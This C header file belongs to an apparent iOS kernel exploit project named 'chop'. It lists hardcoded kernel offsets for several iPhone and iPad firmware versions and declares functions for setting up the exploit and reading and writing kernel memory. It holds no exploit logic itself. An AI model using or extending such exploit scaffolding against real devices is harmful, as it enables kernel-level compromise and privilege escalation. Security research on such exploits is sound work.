//
//  m1n0rthreat.h
//  chop
//
//  Created by Joshua Hill on 1/19/14.
//
//

#ifndef chop_m1n0rthreat_h
#define chop_m1n0rthreat_h

//iPhone4s 6.1.3
//#define PTSD_START (0x1F41BD-0x1000)
//#define KERN_UUID (0x31F920-0x1000)
//#define COREFILE_SYSCTL_DATA (0x2E6A08-0x1000)

// iPhone5 7.0.6
//#define PTSD_START (0x27CA81 - 0x1000)
//#define COREFILE_SYSCTL_DATA (0x337B04 - 0x1000)

// iPhone5 7.0.4
#define PTSD_START 0x27CA81
#define COREFILE_SYSCTL_DATA 0x337B04
#define KERN_UUID 0x349170

// iPad Mini 7.0.6
//#define KERN_UUID 0x3451B0
//#define PTSD_START 0x278DB9
//#define COREFILE_SYSCTL_DATA 0x333B04

void printuuid();
int m1n0rthreat_init(vm_address_t base);
int m1n0rthreat_exploit(vm_address_t base);
vm_address_t m1n0rthreat_kernel_get(vm_address_t address);
void m1n0rthreat_kernel_set(vm_address_t address, void* value);
vm_size_t m1n0rthreat_kernel_read(vm_address_t addr, void* buffer, vm_size_t size);
vm_size_t m1n0rthreat_kernel_write(vm_address_t addr, void* buffer, vm_size_t size);

#endif
